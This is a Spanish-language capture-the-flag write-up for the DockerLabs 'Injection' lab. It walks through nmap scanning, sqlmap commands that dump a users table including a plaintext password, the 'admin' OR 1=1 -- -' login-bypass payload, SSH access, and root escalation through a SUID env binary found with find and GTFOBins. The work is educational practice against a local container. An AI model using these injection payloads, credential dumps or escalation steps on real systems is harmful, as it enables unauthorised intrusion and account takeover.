plataforma: https://dockerlabs.es/#/
Mirror: https://mega.nz/file/wLN2nQ7B#p0YzUFAsrE3ilnJ9HzMr1hfsUq2DPYiDHlIU_9IEizU
Nombre: Injection
Dificultad: muy fácil
Herramientas:
[[Ping]]
[[NMAP]]
[[WhatWeb]]
[[SQLMAP]]
[[Puerto 22 SSH - SFTP]]



Deploy:

```sh fold:"Deploy injection machine"
sudo bash autodeploy.sh injection.tar
```

![[DockerLabs - Injection - Deploy.png]]

Ping para comprobar conectividad y ver el ttl: 64
![[DockerLabs - Injection - Ping.png]]

Reconocimiento
```sh fold:"Reconocimiento con nmap"
sudo nmap -sS -p- -sC -sV -Pn 172.17.0.2
```

Puertos abiertos:
![[DockerLabs - Injection - Nmap.png]]

Nos encontramos los puertos 
- 22
- 80
Primero investigamos el puerto 80
Web:
![[DockerLabs - Injection - Web.png]]

WhatWeb no nos da mucha información

![[DockerLabs - Injection - Whatweb.png]]

Intento varios Usuarios y contraseñas pero conm ninguno acccedo, en todos me da el mensaje:
Wrong Credentials

Vamos a ver algo más sobre eta web


Vamos a ver si con SqlMap podemos sacar algo:

```sh fold:"Sql map"
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
# information_schema
# mysql
# performance_schema
# regyster
# sys
sqlmap -u http://172.17.0.2/index.php --forms -D --tables --batch
# [1 table]
# +-------+
# | users |
# +-------+
sqlmap -u http://172.17.0.2/index.php --forms -D -T users --columns --batch
# +----------+-------------+
# | Column   | Type        |
# +----------+-------------+
# | passwd   | varchar(30) |
# | username | varchar(30) |
# +----------+-------------+
sqlmap -u http://172.17.0.2/index.php --forms -D -T users -C passwd,username --dump --batch
# +------------------+----------+
# | passwd           | username |
# +------------------+----------+
# | KJSDFG789FGSDF78 | dylan    |
# +------------------+----------+

```
Otra forma de hacer el Sql Injection:
![[DockerLabs - Injection - SQL Injection manual.png]]

Explicacion:
Ahora bien, suponiendo que la consulta que busca un usuario en la base de datos es la siguiente:

```sql
SELECT * FROM usuarios WHERE username = 'admin' AND password = 'password';
```

Si insertamos la inyección SQL (`admin' OR 1=1 -- -`) en donde está el texto "admin", la consulta quedará de esta manera:

```sql
SELECT * FROM usuarios WHERE username = 'admin' OR 1=1 -- - AND password = 'password';
```
Esto es posible porque los parámetros de la consulta no están validados:
![[DockerLabs - Injection - Codigo consulta sin validar.png]]


Acceso con usuario dylan:
![[DockerLabs - Injection - User access.png]]

Vamos a intentar entrar por SSH con este usuario y esta contraseña:

Acceso por ssh con el usuario dylan:
![[DockerLabs - Injection - SSH dylan user.png]]


## Escalada de privilegios
sudo -l
![[DockerLabs - Injection - sudo-l.png]]

find / -perm -4000 2>/dev/null

![[DockerLabs - Injection - Suid.png]]

Buscamos en Gtfobins algunos de estos suid
![[DockerLabs - Injection - gtfobbins env.png]]
Encuentro env:
lo ejecutamos con las rutas absolutas


![[DockerLabs - Injection - Escalada de privilegiso.png]]

DockerLabs - Injection -